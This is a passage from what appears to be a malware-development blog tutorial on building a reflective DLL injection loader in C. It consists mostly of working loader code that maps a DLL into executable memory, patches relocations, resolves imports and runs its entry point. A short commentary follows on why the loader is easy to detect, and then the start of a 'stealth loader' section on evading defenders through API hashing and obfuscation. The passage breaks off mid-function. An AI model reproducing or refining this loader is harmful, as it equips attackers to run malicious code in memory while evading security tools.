        </tr>
        <tr>
          <td id="file-main-c-L26" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="26"></td>
          <td id="file-main-c-LC26" class="blob-code blob-code-inner js-file-line">    SIZE_T dllImageSize = ntHeaders-&gt;<span class="pl-smi">OptionalHeader</span>.<span class="pl-smi">SizeOfImage</span>;</td>
        </tr>
        <tr>
          <td id="file-main-c-L27" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="27"></td>
          <td id="file-main-c-LC27" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L28" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="28"></td>
          <td id="file-main-c-LC28" class="blob-code blob-code-inner js-file-line">    LPVOID dll_base = <span class="pl-c1">VirtualAlloc</span>((LPVOID)ntHeaders-&gt;<span class="pl-smi">OptionalHeader</span>.<span class="pl-smi">ImageBase</span>, dllImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</td>
        </tr>
        <tr>
          <td id="file-main-c-L29" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="29"></td>
          <td id="file-main-c-LC29" class="blob-code blob-code-inner js-file-line">    DWORD_PTR deltaImageBase = (DWORD_PTR)dll_base - (DWORD_PTR)ntHeaders-&gt;<span class="pl-smi">OptionalHeader</span>.<span class="pl-smi">ImageBase</span>;</td>
        </tr>
        <tr>
          <td id="file-main-c-L30" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="30"></td>
          <td id="file-main-c-LC30" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memcpy</span>(dll_base, dll_bytes, ntHeaders-&gt;<span class="pl-smi">OptionalHeader</span>.<span class="pl-smi">SizeOfHeaders</span>);</td>
        </tr>
        <tr>
          <td id="file-main-c-L31" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="31"></td>
          <td id="file-main-c-LC31" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L32" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="32"></td>
          <td id="file-main-c-LC32" class="blob-code blob-code-inner js-file-line">    PIMAGE_SECTION_HEADER section = <span class="pl-c1">IMAGE_FIRST_SECTION</span>(ntHeaders);</td>
        </tr>
        <tr>
          <td id="file-main-c-L33" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="33"></td>
          <td id="file-main-c-LC33" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">for</span> (<span class="pl-c1">size_t</span> i = <span class="pl-c1">0</span>; i &lt; ntHeaders-&gt;<span class="pl-smi">FileHeader</span>.<span class="pl-smi">NumberOfSections</span>; i++) {</td>
        </tr>
        <tr>
          <td id="file-main-c-L34" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="34"></td>
          <td id="file-main-c-LC34" class="blob-code blob-code-inner js-file-line">        LPVOID sectionDestination = (LPVOID)((DWORD_PTR)dll_base + (DWORD_PTR)section-&gt;<span class="pl-smi">VirtualAddress</span>);</td>
        </tr>
        <tr>
          <td id="file-main-c-L35" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="35"></td>
          <td id="file-main-c-LC35" class="blob-code blob-code-inner js-file-line">        LPVOID sectionBytes = (LPVOID)((DWORD_PTR)dll_bytes + (DWORD_PTR)section-&gt;<span class="pl-smi">PointerToRawData</span>);</td>
        </tr>
        <tr>
          <td id="file-main-c-L36" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="36"></td>
          <td id="file-main-c-LC36" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">memcpy</span>(sectionDestination, sectionBytes, section-&gt;<span class="pl-smi">SizeOfRawData</span>);</td>
        </tr>
        <tr>
          <td id="file-main-c-L37" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="37"></td>
          <td id="file-main-c-LC37" class="blob-code blob-code-inner js-file-line">        section++;</td>
        </tr>
        <tr>
          <td id="file-main-c-L38" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="38"></td>
          <td id="file-main-c-LC38" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-main-c-L39" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="39"></td>
          <td id="file-main-c-LC39" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L40" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="40"></td>
          <td id="file-main-c-LC40" class="blob-code blob-code-inner js-file-line">    IMAGE_DATA_DIRECTORY relocations = ntHeaders-&gt;<span class="pl-smi">OptionalHeader</span>.<span class="pl-smi">DataDirectory</span>[IMAGE_DIRECTORY_ENTRY_BASERELOC];</td>
        </tr>
        <tr>
          <td id="file-main-c-L41" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="41"></td>
          <td id="file-main-c-LC41" class="blob-code blob-code-inner js-file-line">    DWORD_PTR relocationTable = relocations.<span class="pl-smi">VirtualAddress</span> + (DWORD_PTR)dll_base;</td>
        </tr>
        <tr>
          <td id="file-main-c-L42" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="42"></td>
          <td id="file-main-c-LC42" class="blob-code blob-code-inner js-file-line">    DWORD relocationsProcessed = <span class="pl-c1">0</span>;</td>
        </tr>
        <tr>
          <td id="file-main-c-L43" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="43"></td>
          <td id="file-main-c-LC43" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L44" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="44"></td>
          <td id="file-main-c-LC44" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">while</span> (relocationsProcessed &lt; relocations.<span class="pl-smi">Size</span>) {</td>
        </tr>
        <tr>
          <td id="file-main-c-L45" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="45"></td>
          <td id="file-main-c-LC45" class="blob-code blob-code-inner js-file-line">        PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)(relocationTable + relocationsProcessed);</td>
        </tr>
        <tr>
          <td id="file-main-c-L46" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="46"></td>
          <td id="file-main-c-LC46" class="blob-code blob-code-inner js-file-line">        relocationsProcessed += <span class="pl-k">sizeof</span>(BASE_RELOCATION_BLOCK);</td>
        </tr>
        <tr>
          <td id="file-main-c-L47" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="47"></td>
          <td id="file-main-c-LC47" class="blob-code blob-code-inner js-file-line">        DWORD relocationsCount = (relocationBlock-&gt;<span class="pl-smi">BlockSize</span> - <span class="pl-k">sizeof</span>(BASE_RELOCATION_BLOCK)) / <span class="pl-k">sizeof</span>(BASE_RELOCATION_ENTRY);</td>
        </tr>
        <tr>
          <td id="file-main-c-L48" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="48"></td>
          <td id="file-main-c-LC48" class="blob-code blob-code-inner js-file-line">        PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)(relocationTable + relocationsProcessed);</td>
        </tr>
        <tr>
          <td id="file-main-c-L49" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="49"></td>
          <td id="file-main-c-LC49" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L50" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="50"></td>
          <td id="file-main-c-LC50" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">for</span> (DWORD i = <span class="pl-c1">0</span>; i &lt; relocationsCount; i++) {</td>
        </tr>
        <tr>
          <td id="file-main-c-L51" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="51"></td>
          <td id="file-main-c-LC51" class="blob-code blob-code-inner js-file-line">            relocationsProcessed += <span class="pl-k">sizeof</span>(BASE_RELOCATION_ENTRY);</td>
        </tr>
        <tr>
          <td id="file-main-c-L52" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="52"></td>
          <td id="file-main-c-LC52" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L53" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="53"></td>
          <td id="file-main-c-LC53" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">if</span> (relocationEntries[i].<span class="pl-smi">Type</span> == <span class="pl-c1">0</span>) {</td>
        </tr>
        <tr>
          <td id="file-main-c-L54" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="54"></td>
          <td id="file-main-c-LC54" class="blob-code blob-code-inner js-file-line">                <span class="pl-k">continue</span>;</td>
        </tr>
        <tr>
          <td id="file-main-c-L55" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="55"></td>
          <td id="file-main-c-LC55" class="blob-code blob-code-inner js-file-line">            }</td>
        </tr>
        <tr>
          <td id="file-main-c-L56" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="56"></td>
          <td id="file-main-c-LC56" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L57" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="57"></td>
          <td id="file-main-c-LC57" class="blob-code blob-code-inner js-file-line">            DWORD_PTR relocationRVA = relocationBlock-&gt;<span class="pl-smi">PageAddress</span> + relocationEntries[i].<span class="pl-smi">Offset</span>;</td>
        </tr>
        <tr>
          <td id="file-main-c-L58" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="58"></td>
          <td id="file-main-c-LC58" class="blob-code blob-code-inner js-file-line">            DWORD_PTR addressToPatch = <span class="pl-c1">0</span>;</td>
        </tr>
        <tr>
          <td id="file-main-c-L59" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="59"></td>
          <td id="file-main-c-LC59" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">ReadProcessMemory</span>(<span class="pl-bu">GetCurrentProcess</span>(), (LPCVOID)((DWORD_PTR)dll_base + relocationRVA), &amp;addressToPatch, <span class="pl-k">sizeof</span>(DWORD_PTR), <span class="pl-c1">NULL</span>);</td>
        </tr>
        <tr>
          <td id="file-main-c-L60" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="60"></td>
          <td id="file-main-c-LC60" class="blob-code blob-code-inner js-file-line">            addressToPatch += deltaImageBase;</td>
        </tr>
        <tr>
          <td id="file-main-c-L61" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="61"></td>
          <td id="file-main-c-LC61" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">memcpy</span>((PVOID)((DWORD_PTR)dll_base + relocationRVA), &amp;addressToPatch, <span class="pl-k">sizeof</span>(DWORD_PTR));</td>
        </tr>
        <tr>
          <td id="file-main-c-L62" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="62"></td>
          <td id="file-main-c-LC62" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-main-c-L63" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="63"></td>
          <td id="file-main-c-LC63" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-main-c-L64" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="64"></td>
          <td id="file-main-c-LC64" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L65" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="65"></td>
          <td id="file-main-c-LC65" class="blob-code blob-code-inner js-file-line">    PIMAGE_IMPORT_DESCRIPTOR importDescriptor = <span class="pl-c1">NULL</span>;</td>
        </tr>
        <tr>
          <td id="file-main-c-L66" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="66"></td>
          <td id="file-main-c-LC66" class="blob-code blob-code-inner js-file-line">    IMAGE_DATA_DIRECTORY importsDirectory = ntHeaders-&gt;<span class="pl-smi">OptionalHeader</span>.<span class="pl-smi">DataDirectory</span>[IMAGE_DIRECTORY_ENTRY_IMPORT];</td>
        </tr>
        <tr>
          <td id="file-main-c-L67" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="67"></td>
          <td id="file-main-c-LC67" class="blob-code blob-code-inner js-file-line">    importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.<span class="pl-smi">VirtualAddress</span> + (DWORD_PTR)dll_base);</td>
        </tr>
        <tr>
          <td id="file-main-c-L68" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="68"></td>
          <td id="file-main-c-LC68" class="blob-code blob-code-inner js-file-line">    PCHAR libraryName = <span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span></span>;</td>
        </tr>
        <tr>
          <td id="file-main-c-L69" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="69"></td>
          <td id="file-main-c-LC69" class="blob-code blob-code-inner js-file-line">    HMODULE library = <span class="pl-c1">NULL</span>;</td>
        </tr>
        <tr>
          <td id="file-main-c-L70" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="70"></td>
          <td id="file-main-c-LC70" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L71" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="71"></td>
          <td id="file-main-c-LC71" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">while</span> (importDescriptor-&gt;<span class="pl-smi">Name</span> != <span class="pl-c1">0</span>) {</td>
        </tr>
        <tr>
          <td id="file-main-c-L72" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="72"></td>
          <td id="file-main-c-LC72" class="blob-code blob-code-inner js-file-line">        libraryName = (PCHAR)importDescriptor-&gt;<span class="pl-smi">Name</span> + (DWORD_PTR)dll_base;</td>
        </tr>
        <tr>
          <td id="file-main-c-L73" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="73"></td>
          <td id="file-main-c-LC73" class="blob-code blob-code-inner js-file-line">        library = <span class="pl-c1">LoadLibraryA</span>(libraryName);</td>
        </tr>
        <tr>
          <td id="file-main-c-L74" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="74"></td>
          <td id="file-main-c-LC74" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L75" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="75"></td>
          <td id="file-main-c-LC75" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> (library) {</td>
        </tr>
        <tr>
          <td id="file-main-c-L76" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="76"></td>
          <td id="file-main-c-LC76" class="blob-code blob-code-inner js-file-line">            PIMAGE_THUNK_DATA thunk = <span class="pl-c1">NULL</span>;</td>
        </tr>
        <tr>
          <td id="file-main-c-L77" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="77"></td>
          <td id="file-main-c-LC77" class="blob-code blob-code-inner js-file-line">            thunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)dll_base + importDescriptor-&gt;<span class="pl-smi">FirstThunk</span>);</td>
        </tr>
        <tr>
          <td id="file-main-c-L78" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="78"></td>
          <td id="file-main-c-LC78" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L79" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="79"></td>
          <td id="file-main-c-LC79" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">while</span> (thunk-&gt;<span class="pl-smi">u1</span>.<span class="pl-smi">AddressOfData</span> != <span class="pl-c1">0</span>) {</td>
        </tr>
        <tr>
          <td id="file-main-c-L80" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="80"></td>
          <td id="file-main-c-LC80" class="blob-code blob-code-inner js-file-line">                <span class="pl-k">if</span> (<span class="pl-c1">IMAGE_SNAP_BY_ORDINAL</span>(thunk-&gt;<span class="pl-smi">u1</span>.<span class="pl-smi">Ordinal</span>)) {</td>
        </tr>
        <tr>
          <td id="file-main-c-L81" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="81"></td>
          <td id="file-main-c-LC81" class="blob-code blob-code-inner js-file-line">                    LPCSTR functionOrdinal = (LPCSTR)<span class="pl-c1">IMAGE_ORDINAL</span>(thunk-&gt;<span class="pl-smi">u1</span>.<span class="pl-smi">Ordinal</span>);</td>
        </tr>
        <tr>
          <td id="file-main-c-L82" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="82"></td>
          <td id="file-main-c-LC82" class="blob-code blob-code-inner js-file-line">                    thunk-&gt;<span class="pl-smi">u1</span>.<span class="pl-smi">Function</span> = (DWORD_PTR)<span class="pl-c1">GetProcAddress</span>(library, functionOrdinal);</td>
        </tr>
        <tr>
          <td id="file-main-c-L83" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="83"></td>
          <td id="file-main-c-LC83" class="blob-code blob-code-inner js-file-line">                }</td>
        </tr>
        <tr>
          <td id="file-main-c-L84" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="84"></td>
          <td id="file-main-c-LC84" class="blob-code blob-code-inner js-file-line">                <span class="pl-k">else</span> {</td>
        </tr>
        <tr>
          <td id="file-main-c-L85" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="85"></td>
          <td id="file-main-c-LC85" class="blob-code blob-code-inner js-file-line">                    PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)dll_base + thunk-&gt;<span class="pl-smi">u1</span>.<span class="pl-smi">AddressOfData</span>);</td>
        </tr>
        <tr>
          <td id="file-main-c-L86" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="86"></td>
          <td id="file-main-c-LC86" class="blob-code blob-code-inner js-file-line">                    DWORD_PTR functionAddress = (DWORD_PTR)<span class="pl-c1">GetProcAddress</span>(library, functionName-&gt;<span class="pl-smi">Name</span>);</td>
        </tr>
        <tr>
          <td id="file-main-c-L87" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="87"></td>
          <td id="file-main-c-LC87" class="blob-code blob-code-inner js-file-line">                    thunk-&gt;<span class="pl-smi">u1</span>.<span class="pl-smi">Function</span> = functionAddress;</td>
        </tr>
        <tr>
          <td id="file-main-c-L88" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="88"></td>
          <td id="file-main-c-LC88" class="blob-code blob-code-inner js-file-line">                }</td>
        </tr>
        <tr>
          <td id="file-main-c-L89" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="89"></td>
          <td id="file-main-c-LC89" class="blob-code blob-code-inner js-file-line">                ++thunk;</td>
        </tr>
        <tr>
          <td id="file-main-c-L90" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="90"></td>
          <td id="file-main-c-LC90" class="blob-code blob-code-inner js-file-line">            }</td>
        </tr>
        <tr>
          <td id="file-main-c-L91" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="91"></td>
          <td id="file-main-c-LC91" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-main-c-L92" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="92"></td>
          <td id="file-main-c-LC92" class="blob-code blob-code-inner js-file-line">        importDescriptor++;</td>
        </tr>
        <tr>
          <td id="file-main-c-L93" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="93"></td>
          <td id="file-main-c-LC93" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-main-c-L94" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="94"></td>
          <td id="file-main-c-LC94" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L95" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="95"></td>
          <td id="file-main-c-LC95" class="blob-code blob-code-inner js-file-line">    DLLEntry DllEntry = (DLLEntry)((DWORD_PTR)dll_base + ntHeaders-&gt;<span class="pl-smi">OptionalHeader</span>.<span class="pl-smi">AddressOfEntryPoint</span>);</td>
        </tr>
        <tr>
          <td id="file-main-c-L96" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="96"></td>
          <td id="file-main-c-LC96" class="blob-code blob-code-inner js-file-line">    (*DllEntry)((HINSTANCE)dll_base, DLL_PROCESS_ATTACH, <span class="pl-c1">0</span>);</td>
        </tr>
        <tr>
          <td id="file-main-c-L97" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="97"></td>
          <td id="file-main-c-LC97" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L98" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="98"></td>
          <td id="file-main-c-LC98" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">CloseHandle</span>(dll);</td>
        </tr>
        <tr>
          <td id="file-main-c-L99" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="99"></td>
          <td id="file-main-c-LC99" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">HeapFree</span>(<span class="pl-c1">GetProcessHeap</span>(), <span class="pl-c1">0</span>, dll_bytes);</td>
        </tr>
        <tr>
          <td id="file-main-c-L100" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="100"></td>
          <td id="file-main-c-LC100" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L101" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="101"></td>
          <td id="file-main-c-LC101" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> <span class="pl-c1">0</span>;</td>
        </tr>
        <tr>
          <td id="file-main-c-L102" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="102"></td>
          <td id="file-main-c-LC102" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L103" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="103"></td>
          <td id="file-main-c-LC103" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/maliciousgroup/5af437a474d580da8a172e95bdb1b2a3/raw/9aa2fc53b695fbb4137fd7108acfb40d3e2b5fd9/main.c" style="float:right">view raw</a>
        <a href="https://gist.github.com/maliciousgroup/5af437a474d580da8a172e95bdb1b2a3#file-main-c">
          main.c
        </a>
        hosted with ‚ù§ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
<!--kg-card-end: html--><hr><!--kg-card-begin: html--><p>After typing out the code in <code>main.c</code>, build the solution and run the executable. This should work with the default <code>CMakeLists.txt</code> that came with the project creation.</p><!--kg-card-end: html--><figure class="kg-card kg-image-card"><img src="./Writing your own RDI _sRDI loader using C and ASM_files/image-9.png" class="kg-image" alt="" loading="lazy" width="2000" height="1074" srcset="https://blog.malicious.group/content/images/size/w600/2023/04/image-9.png 600w, https://blog.malicious.group/content/images/size/w1000/2023/04/image-9.png 1000w, https://blog.malicious.group/content/images/size/w1600/2023/04/image-9.png 1600w, https://blog.malicious.group/content/images/size/w2400/2023/04/image-9.png 2400w" sizes="(min-width: 720px) 720px"></figure><p>As you can see above, this example works. However, this is a very basic example of a RDI injection without any optimizations or obfuscation, and this example would not work in most secure environments. To see why, let's take a closer look by doing a little analysis on the binary as it is now. </p><hr><p>First let's run the binary, and instead of clicking the "<em>Ok</em>" button to close it, let's open <em>Process Hacker</em> and take a look at the memory while it is running.</p><figure class="kg-card kg-image-card"><img src="./Writing your own RDI _sRDI loader using C and ASM_files/image-14.png" class="kg-image" alt="" loading="lazy" width="2000" height="1340" srcset="https://blog.malicious.group/content/images/size/w600/2023/04/image-14.png 600w, https://blog.malicious.group/content/images/size/w1000/2023/04/image-14.png 1000w, https://blog.malicious.group/content/images/size/w1600/2023/04/image-14.png 1600w, https://blog.malicious.group/content/images/size/w2400/2023/04/image-14.png 2400w" sizes="(min-width: 720px) 720px"></figure><p>As you can see in the above image, that we currently have a RWX region in memory which is a dead give-away something suspect is happening in the process. We will need to make sure to fix this along with everything else in the upcoming version.</p><hr><p>Next, let's open the file with <em>CFF Explorer</em> as seen below.</p><figure class="kg-card kg-image-card"><img src="./Writing your own RDI _sRDI loader using C and ASM_files/image-10.png" class="kg-image" alt="" loading="lazy" width="2000" height="1649" srcset="https://blog.malicious.group/content/images/size/w600/2023/04/image-10.png 600w, https://blog.malicious.group/content/images/size/w1000/2023/04/image-10.png 1000w, https://blog.malicious.group/content/images/size/w1600/2023/04/image-10.png 1600w, https://blog.malicious.group/content/images/2023/04/image-10.png 2294w" sizes="(min-width: 720px) 720px"></figure><!--kg-card-begin: html--><p>Here you can see that the <code>dll_loader.exe</code> file is importing <code>KERNEL32.dll</code> with 24 functions, and <code>msvcrt.dll</code> with 26 functions. You may be asking yourself why the hell are there 50 functions imported, when the code itself only uses a fraction of those?  This is because the <code>msvcrt.dll</code> and higher-level Windows API functions also use underlying functions themselves.</p><!--kg-card-end: html--><hr><!--kg-card-begin: html--><p>Lastly, let's take a look at the binary using <code>strings.exe</code> from the Sys Internals tools.</p><!--kg-card-end: html--><!--kg-card-begin: html--><pre>C:\Temp&gt;strings.exe C:\Maldev\evasion\dll_loader\cmake-build-debug\dll_loader.exe | find /c /v ""
1490
</pre><!--kg-card-end: html--><!--kg-card-begin: html--><p>There are 1490 entries within the <code>strings.exe</code> output, and an example of some of the items we want to remove are seen below.</p><!--kg-card-end: html--><figure class="kg-card kg-image-card"><img src="./Writing your own RDI _sRDI loader using C and ASM_files/image-11.png" class="kg-image" alt="" loading="lazy" width="1583" height="1580" srcset="https://blog.malicious.group/content/images/size/w600/2023/04/image-11.png 600w, https://blog.malicious.group/content/images/size/w1000/2023/04/image-11.png 1000w, https://blog.malicious.group/content/images/2023/04/image-11.png 1583w" sizes="(min-width: 720px) 720px"></figure><p>All the functions we are using are easily seen in plain-text in the above output. This is a problem for any malware developer and needs to be taken care of to make this loader more stealthy. </p><p>As you can see in the examples above, that the basic loader is very loud, and needs a lot of work. Now let's take a look at writing an obfuscated RDI using the Windows Native API, obfuscated function pointers, function name hashing and more.</p><hr><p></p><h2 id="stealth-loader">Stealth Loader</h2><p></p><p>In this version of the loader, we will utilize the files we generated previously to store custom structures, function definitions, and assembly code to improve the stealthiness of the RDI loader.</p><!--kg-card-begin: html--><p>Using the same <code>dll_loader</code> project, comment out the current <code>main()</code> function for now so we can rewrite everything from scratch.</p><!--kg-card-end: html--><!--kg-card-begin: html--><p>First, we need to create some helper functions for function hashing and function address resolution. To achieve this, we will incorporate a CRC hashing function from the <code>peb.c</code> file, as well as a <code>get_proc_address_by_hash</code> function that resolves function addresses based on the provided DLL.</p><!--kg-card-end: html--><hr><h2 id="helper-functions">Helper Functions</h2><p></p><!--kg-card-begin: html--><p><code>peb.c</code></p><!--kg-card-end: html--><!--kg-card-begin: html--><script src="./Writing your own RDI _sRDI loader using C and ASM_files/9215ec90ef53a1e81651b65ba45ac764.js.download"></script><link rel="stylesheet" href="./Writing your own RDI _sRDI loader using C and ASM_files/gist-embed-cdd2b47f37c5.css"><div id="gist121782334" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-peb-c" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  ">

        
<div class="js-check-bidi js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="C" data-tagsearch-path="peb.c">
        <tbody><tr>
          <td id="file-peb-c-L1" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-peb-c-LC1" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">"</span>peb.h<span class="pl-pds">"</span></span></td>
        </tr>
        <tr>
          <td id="file-peb-c-L2" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-peb-c-LC2" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>stdint.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-peb-c-L3" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-peb-c-LC3" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-peb-c-L4" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-peb-c-LC4" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">uint32_t</span> <span class="pl-en">crc32b</span>(<span class="pl-k">const</span> <span class="pl-c1">uint8_t</span> *str) {</td>
        </tr>
